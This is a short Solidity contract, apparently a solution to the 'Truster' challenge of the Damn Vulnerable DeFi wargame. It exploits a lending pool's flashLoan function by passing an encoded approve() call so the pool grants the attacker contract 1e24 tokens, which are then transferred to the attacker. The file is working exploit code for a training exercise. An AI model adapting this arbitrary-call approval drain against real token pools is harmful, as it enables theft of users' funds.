// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTruster {
    function attack(
        address _attacker,
        address _token,
        address _pool
    ) external {
        TrusterLenderPool(_pool).flashLoan(
            0,
            address(this), // doesn't matter what this address is, can't be address(0)
            _token,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                1e24
            )
        );
        DamnValuableToken(_token).transferFrom(_pool, _attacker, 1e24);
    }
}
